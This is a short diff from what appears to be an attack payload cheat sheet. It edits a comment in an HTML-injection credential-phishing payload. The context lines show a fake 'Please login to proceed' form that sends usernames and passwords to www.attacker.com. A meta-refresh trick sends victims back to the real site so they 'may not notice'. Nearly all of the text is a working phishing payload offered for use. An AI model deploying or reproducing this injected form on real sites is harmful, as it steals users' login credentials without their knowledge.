@@ -49,7 +49,7 @@ Submits credentials to the www.attacker.com (Embeds Login Screen inside applicat
 
 # Gets stuck on attackers page, do this to resolve issue, victim may not notice the redirect :)
 # In Apache, edit index.html to look like this 
-# <meta http-equiv="refresh" content="0;url=https://victims.website.com/link-they-should-be-on/">
+# <meta http-equiv="refresh" content="0;url=https://victims.website.com/link-they-started-on/">
 
 <h3>Please login to proceed</h3> <form action=http://www.attacker.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
 ```
